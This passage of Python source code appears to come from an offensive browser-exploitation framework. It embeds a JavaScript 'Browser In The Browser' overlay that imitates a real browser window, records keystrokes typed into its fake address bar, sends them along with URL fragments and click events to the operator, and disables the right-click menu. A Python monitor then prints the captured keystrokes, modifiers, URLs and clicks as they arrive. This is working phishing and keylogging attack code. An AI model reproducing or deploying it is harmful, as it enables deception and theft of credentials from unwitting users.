                if (pendingKeys.length >= 12) {{
                    sendCapturedData({{ event: 'keystrokes', keystrokes: pendingKeys.slice() }});
                    pendingKeys = [];
                }}
            }}

            addressBar.addEventListener('keydown', function(e) {{
                recordKey(e, 'omnibox');
                if (e.key === 'Enter') {{
                    loadUrl(addressBar.value);
                }}
            }});

            if (CFG.capture_urls) {{
                addressBar.addEventListener('input', function(e) {{
                    sendCapturedData({{ event: 'url_typing', fragment: String(e.target.value).slice(-80) }});
                }});
            }}

            function wireNavClick(eventName) {{
                if (CFG.capture_clicks) sendCapturedData({{ event: eventName }});
            }}

            backBtn.onclick = function() {{
                wireNavClick('back_clicked');
                const tab = getActiveTab();
                if (!tab || tab.isNtp) return;
                try {{ tab.iframe.contentWindow.history.back(); }} catch (e) {{}}
            }};
            forwardBtn.onclick = function() {{
                wireNavClick('forward_clicked');
                const tab = getActiveTab();
                if (!tab || tab.isNtp) return;
                try {{ tab.iframe.contentWindow.history.forward(); }} catch (e) {{}}
            }};
            refreshBtn.onclick = function() {{ reloadActiveTab(); }};
            homeBtn.onclick = function() {{
                wireNavClick('home_clicked');
                loadUrl('https://www.google.com');
            }};

            newTabBtn.onclick = function() {{ openTab({{ ntp: true }}); }};

            document.addEventListener('click', function() {{
                menuPanel.style.display = 'none';
            }});
            document.addEventListener('keydown', function(e) {{
                if (!document.getElementById('ks-bitb-root')) return;
                if (e.ctrlKey && (e.key === 't' || e.key === 'T')) {{
                    e.preventDefault();
                    openTab({{ ntp: true }});
                }}
            }});

            function stop() {{
                clearInterval(keyFlush);
                if (pendingKeys.length) {{
                    sendCapturedData({{ event: 'keystrokes', keystrokes: pendingKeys.slice() }});
                    pendingKeys = [];
                }}
                try {{ root.remove(); }} catch (e) {{}}
                window.__ksBitb = null;
            }}

            window.__ksBitb = {{
                stop: stop,
                browser: BROWSER,
                os: OS,
                layout: LAYOUT,
                theme: DARK ? 'dark' : 'light'
            }};

            root.addEventListener('contextmenu', function(e) {{ e.preventDefault(); }});

            openTab({{ url: INITIAL }});
            sendCapturedData({{
                event: 'browser_initialized',
                browser_type: BROWSER,
                os: OS,
                layout: LAYOUT,
                theme: DARK ? 'dark' : 'light',
                initial_url: INITIAL
            }});

            return JSON.stringify({{
                ok: true,
                browser: BROWSER,
                os: OS,
                layout: LAYOUT,
                theme: DARK ? 'dark' : 'light',
                initial_url: INITIAL
            }});
        }})();
        """

    def _monitor_captures(self, bitb_id: str, timeout_value: int):
        """Monitor and display captured data in real-time."""
        self._ensure_browser_server()
        if not self.browser_server:
            print_error("Browser server not available")
            return

        start_time = time.time()
        last_response_count = 0

        try:
            while True:
                if time.time() - start_time >= timeout_value:
                    break

                session = self.browser_server.get_session(self.session_id)
                if not session:
                    print_error("Session not found")
                    break

                if not hasattr(session, "responses"):
                    time.sleep(0.5)
                    continue

                responses = session.responses if isinstance(session.responses, list) else []
                response_count = len(responses)

                if response_count > last_response_count:
                    for response in responses[last_response_count:]:
                        if not isinstance(response, dict) or response.get("command_id") != bitb_id:
                            continue
                        result_data = response.get("result", "")
                        if not result_data:
                            continue
                        try:
                            data = json.loads(result_data)
                        except json.JSONDecodeError:
                            print_debug(f"[BITB] Raw response: {result_data}")
                            continue
                        if data.get("type") != "browser_in_browser":
                            continue

                        event_data = data.get("data", {})
                        event_type = event_data.get("event", "")

                        if event_type == "browser_initialized":
                            print_success(
                                f"[BITB] Initialized — {event_data.get('browser_type')} / "
                                f"{event_data.get('os')} / {event_data.get('layout')}"
                            )
                            print_info(f"[BITB] Initial URL: {event_data.get('initial_url', '?')}")
                        elif event_type == "url_entered":
                            print_success(f"[BITB] URL: {event_data.get('url', '')}")
                        elif event_type == "url_typing":
                            print_debug(f"[BITB] Omnibox: ...{event_data.get('fragment', '')}")
                        elif event_type == "keystrokes":
                            for key_data in event_data.get("keystrokes", []):
                                where = key_data.get("where", "")
                                prefix = f"[{where}] " if where else ""
                                key = key_data.get("key", "")
                                if key == "Enter":
                                    print_info(f"[BITB] {prefix}<Enter>")
                                elif key == " ":
                                    print_info(f"[BITB] {prefix}<Space>")
                                elif len(key) == 1:
                                    mods = []
                                    if key_data.get("shiftKey"):
                                        mods.append("Shift")
                                    if key_data.get("ctrlKey"):
                                        mods.append("Ctrl")
                                    if key_data.get("altKey"):
                                        mods.append("Alt")
                                    if key_data.get("metaKey"):
                                        mods.append("Meta")
                                    mod = "+".join(mods) + "+" if mods else ""
                                    print_info(f"[BITB] {prefix}{mod}{key}")
                                else:
                                    print_info(f"[BITB] {prefix}<{key}>")
                        elif event_type == "iframe_click":
                            click = event_data.get("click", {})
                            print_info(
                                f"[BITB] [CLICK] {click.get('target', '?')} @ {click.get('url', '?')}"
                            )
                        elif event_type.endswith("_clicked") or event_type == "tab_clicked":
                            print_info(f"[BITB] [ACTION] {event_type}")

                    last_response_count = response_count

                time.sleep(0.5)
        except KeyboardInterrupt:
            print_status("Stopping Browser In The Browser monitoring...")

        print_status("[*] Monitoring stopped. Overlay remains until window.__ksBitb.stop().")
